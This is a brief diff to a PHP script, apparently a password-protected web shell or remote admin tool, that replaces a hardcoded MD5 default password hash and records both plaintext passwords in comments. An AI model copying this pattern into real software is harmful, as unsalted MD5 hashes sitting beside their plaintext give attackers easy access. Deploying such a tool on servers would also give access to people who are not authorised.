@@ -21,7 +21,7 @@ $version = '1.1.0';
 $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
 
 // --- MD5 Password ---
-$default_password_hash = '152f90e55597001071345e8a037d5c4e'; // MD5 for "Pinoy404!"
+$default_password_hash = '2ebba5cd75576c408240e57110e7b4ff'; // MD5 for "myp@ssw0rd"
 
 // Check if a function is enabled (not disabled)
 function is_function_enabled($func) {
